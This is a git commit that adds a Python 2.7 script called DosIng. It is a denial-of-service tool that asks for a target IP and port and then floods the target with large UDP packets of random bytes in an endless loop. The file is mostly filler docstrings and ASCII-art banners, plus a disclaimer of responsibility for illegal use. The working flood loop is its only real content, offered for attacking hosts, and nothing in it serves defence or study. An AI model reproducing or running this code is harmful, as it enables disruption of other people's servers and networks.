9c738fb3a03b275fa224d811da8566db3c245abd
Dani_aim <71841103+Dani-aim@users.noreply.github.com>
2020-09-24 19:55:16 +0300

    Add files via upload

---
+++ DosIng.py
@@ -0,0 +1,150 @@
+
+'''
+if you are here to steal the code plase go away 
+''''''
+if you are here to steal the code plase go away 
+''''''
+if you are here to steal the code plase go away 
+''''''
+if you are here to steal the code plase go away 
+''''''
+if you are here to steal the code plase go away 
+''''''
+if you are here to steal the code plase go away 
+''''''
+if you are here to steal the code plase go away 
+'''
+
+import sys
+import os
+import time
+import socket
+import random
+
+'''
+if you are here to steal the code plase go away 
+'''
+
+#initsocksamdbytes#
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(14090)
+###################
+
+os.system('mode con: cols=200 lines=700')
+
+'''
+if you are here to steal the code plase go away 
+'''
+
+print (" ")
+print ("   $$$$$$$\                      $$$$$$\                     ")
+print ("   $$  __$$\                     \_$$  _|                    ")
+print ("   $$ |  $$ | $$$$$$\   $$$$$$$\   $$ |  $$$$$$$\   $$$$$$\  ")
+print ("   $$ |  $$ |$$  __$$\ $$  _____|  $$ |  $$  __$$\ $$  __$$\ ")
+print ("   $$ |  $$ |$$ /  $$ |\$$$$$$\    $$ |  $$ |  $$ |$$ /  $$ |")
+print ("   $$ |  $$ |$$ |  $$ | \____$$\   $$ |  $$ |  $$ |$$ |  $$ |")
+print ("   $$ |  $$ |$$ |  $$ | \____$$\   $$ |  $$ |  $$ |$$ |  $$ |")
+print ("   $$$$$$$  |\$$$$$$  |$$$$$$$  |$$$$$$\ $$ |  $$ |\$$$$$$$ |")
+print ("   \_______/  \______/ \_______/ \______|\__|  \__| \____$$ |")
+print ("                                                   $$\   $$ |")
+print ("                                                   \$$$$$$  |")
+print ("                                                    \______/ ")
+print ("                          DEV: Dani_aim               ")
+
+'''
+if you are here to steal the code plase go away 
+''''''
+if you are here to steal the code plase go away 
+''''''
+if you are here to steal the code plase go away 
+''''''
+if you are here to steal the code plase go away 
+''''''
+if you are here to steal the code plase go away 
+''''''
+if you are here to steal the code plase go away 
+''''''
+if you are here to steal the code plase go away 
+''''''
+if you are here to steal the code plase go away 
+''''''
+if you are here to steal the code plase go away 
+''''''
+if you are here to steal the code plase go away 
+''''''
+if you are here to steal the code plase go away 
+''''''
+if you are here to steal the code plase go away 
+''''''
+if you are here to steal the code plase go away 
+'''
+
+print (" ")
+print ("=========================================================================")
+print ("|                                                                       |")
+print ("|  Welcome to DosIng!!                                                  |")
+print ("|  This is a slow posting tool!                                         |")
+print ("|  This version is BETA!                                                |")
+print ("|  It can easly run on a VPS server with python 2.7 installed           | ")
+print ("|  We are not responsible for any illegality committed with this tool!  |")
+print ("|                                                                       |")
+print ("========================================================================= ")
+print (" ")
+
+'''
+if you are here to steal the code plase go away 
+'''
+
+ip = raw_input(" IP/Hostname : ")
+port = input(" Port (recom. is 80) : ")
+print (" ")
+
+'''
+if you are here to steal the code plase go away 
+'''
+
+print (" Attack is in starting... ")
+time.sleep(3)
+sent = 0
+
+'''
+if you are here to steal the code plase go away 
+'''
+
+while True:
+    
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     print ("Sented %s packets to %s throught port : %s!"%(sent,ip,port))
+'''
+if you are here to steal the code plase go away 
+'''
+'''
+if you are here to steal the code plase go away 
+'''
+'''
+if you are here to steal the code plase go away 
+'''
+'''
+if you are here to steal the code plase go away 
+'''
+'''
+if you are here to steal the code plase go away 
+'''
+'''
+if you are here to steal the code plase go away 
+'''
+'''
+if you are here to steal the code plase go away 
+''''''
+if you are here to steal the code plase go away 
+''''''
+if you are here to steal the code plase go away 
+'''
+    
+ 
+
+
+
+
+
